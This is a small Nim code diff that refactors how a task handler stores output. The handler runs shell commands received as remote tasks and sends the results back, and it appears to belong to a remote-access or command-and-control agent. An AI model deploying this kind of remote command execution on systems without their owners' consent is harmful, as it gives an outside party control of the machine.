@@ -11,11 +11,11 @@ proc executeTask*(app: App, taskId: int, params: seq[string]) =
     if cmdSplit[0] == "cd":
       let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
       setCurrentDir(newPath)
-      taskOutput.addData(Text, "result", "changed current working directory to " & newPath)
+      taskOutput.data = "changed current working directory to " & newPath
       app.sendOutput(taskOutput)
       return
     let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
-    taskOutput.addData(Text, "result", output)
+    taskOutput.data = output
     app.sendOutput(taskOutput)
   except OSError:
     taskOutput.error = getCurrentExceptionMsg()
